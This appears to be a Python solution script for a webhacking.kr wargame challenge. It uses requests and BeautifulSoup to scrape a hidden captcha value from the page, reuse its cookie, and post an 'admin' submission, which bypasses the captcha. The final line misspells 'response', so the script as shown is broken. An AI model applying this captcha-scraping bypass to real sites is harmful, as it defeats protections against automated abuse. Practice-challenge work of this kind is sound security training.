import requests
from bs4 import BeautifulSoup

url = 'https://webhacking.kr/challenge/code-4/'
data = {
    'id' : 'admin',
    'cmt' : 'admin',
    'captcha' : ''
}
cookies = {
    'PHPSESSID' : 'your_phpsessid',
    'st' : ''
}
response = requests.get(url, cookies=cookies)
cookies['st'] = response.cookies['st']
soup = BeautifulSoup(response.text, 'html.parser')
value = soup.find(attrs={"name": "captcha_"}).get('value')
data['captcha'] = value

response = requests.post(url, cookies=cookies, data=data)
print(respoinse.text)
